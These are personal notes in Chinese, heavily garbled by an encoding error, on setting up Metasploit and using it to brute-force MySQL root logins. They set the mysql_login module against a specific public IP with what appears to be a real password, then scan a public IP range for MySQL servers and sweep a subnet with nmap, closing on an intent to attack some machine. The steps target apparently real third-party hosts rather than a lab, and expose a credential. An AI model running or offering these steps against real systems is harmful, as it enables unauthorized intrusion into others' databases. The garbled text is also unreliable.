        echo export MSF_DATABASE_CONFIG=/opt/metasploit-framework/database.yml >> /etc/bashrc
        source ~/.bashrc


        msfconsole  è¿è¡Œmsf
        ç„¶åæœåŠ¡å™¨é‡å¯ è¾“å…¥ msfconsole çœ‹çœ‹èƒ½ä¸èƒ½è¿›å»..










å¼±å£ä»¤æ”»å‡»æ˜¯æœ€åŸºæœ¬çš„æ”»å‡»æ–¹å¼ï¼Œmetasploitå½“ç„¶ä¹Ÿæœ‰å¼±å£ä»¤æ”»å‡»çš„æ¨¡å— 
ä¸‹é¢åˆ©ç”¨metasploitæ¥çˆ†ç ´ä¸€ä¸‹æœ¬åœ°çš„3306ï¼Œä¹Ÿå°±æ˜¯mysqlå¯†ç 



â¤ï¸ MySQL ç™»å½•

    å¯åŠ¨MSFCONSOLE:      ğŸ”… msfconsole
    æ‰«ææ‰€æœ‰mysqlæ¨¡å—    ğŸ”… search mysql
    é€‰æ‹©ä¸€ä¸ªæ¨¡å—:        ğŸ”… use auxiliary/scanner/mysql/mysql_login
    
    â¦¿ æ˜¾ç¤ºè¯¥æ¨¡å—æœ‰æ•ˆé€‰é¡¹:  ğŸ”… show options
        é€‰é¡¹åã€å½“å‰è®¾ç½®ã€éœ€æ±‚ã€æè¿°
        å…¶ä¸­Requiredä¸ºyesçš„é€‰é¡¹æ˜¯å¿…é¡»é…ç½®çš„ï¼Œåä¹‹å¯ä»¥ä¸ç”¨é…ç½®ã€‚
        å½“ç„¶ Requiredä¸ºyes å‰é¢æœ‰é»˜è®¤å€¼çš„å¯ä»¥ä¸é…ç½®. æ²¡æœ‰é»˜è®¤å€¼çš„å¿…é¡»é…ç½®.
        å¦‚:RHOSTS å°±æ˜¯ç›®æ ‡IP. è¿™ä¸ªå¿…é¡»é…ç½®çš„...


    â¦¿ æŒ‡å®šç›®æ ‡ã€æŒ‡å®šç”¨æˆ·æ–‡ä»¶ã€æŒ‡å®šå¯†ç æ–‡ä»¶.
        ğŸ“Œ set RHOSTS 23.105.192.96
        ğŸ“Œ set PASSWORD xujian0219
        ğŸ“Œ set USERNAME root
        
        set user_file /Users/v/Desktop/usernames.txt
        set pass_file /Users/v/Desktop/passwords.txt

        set USERNAME root                           è®¾ç½®è´¦æˆ·ä¹Ÿï¼Œå¯ä»¥æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ 
        set USER_FILE æ–‡ä»¶å
        set PASS_FILE lee/mima.txt                  è®¾ç½®ç”¨äºçˆ†ç ´çš„å¯†ç å­—å…¸
        set THREADS 1                               è®¾ç½®çº¿ç¨‹ï¼Œè¶Šå¤§è¶Šå¿«ï¼Œæˆ‘çš„å¯†ç æœ¬ä¸å¤§ï¼Œ1å°±å¤Ÿäº†


    ğŸ”… exploit  æ‰«æçš„æ„æ€... run ä¹Ÿå¯ä»¥.






â¤ï¸ æŸ¥ æŸæ®µIPå†…çš„ æ´»åŠ¨mysql.
    use auxiliary/scanner/mysql/mysql_version

    set RHOSTS 101.92.194.1-254

    run
        101.92.194.204
        101.92.192.0 - 101.92.207.255
        101.92.192.0/20

    æœ¬æœºiP: 101.225.78.86

    netstat -nr 
    æŸ¥çœ‹æœ¬æœºç½‘æ®µ.

    nmap ç½‘æ®µå†…æ´»åŠ¨ä¸»æœº
        nmap -sP 101.225.72/21

        æ€ä¹ˆæ‰¾å‡º æ´»åŠ¨ä¸»æœºä¸­çš„... æœåŠ¡å™¨.

        Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2017-04-10 11:17 CST
        Nmap scan report for 101.225.72.3
        Host is up (0.089s latency).
        Nmap scan report for 101.225.72.6
        Host is up (0.12s latency).
        Nmap scan report for 101.225.72.11
        Host is up (0.11s latency).
        Nmap done: 24 IP addresses (3 hosts up) scanned in 17.88 seconds


    ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ nessus æ¥æ‰«æç½‘æ®µ...


    ç„¶åå‘¢...
    é’ˆå¯¹æŸç”µè„‘ è¿›è¡Œ....xxoo




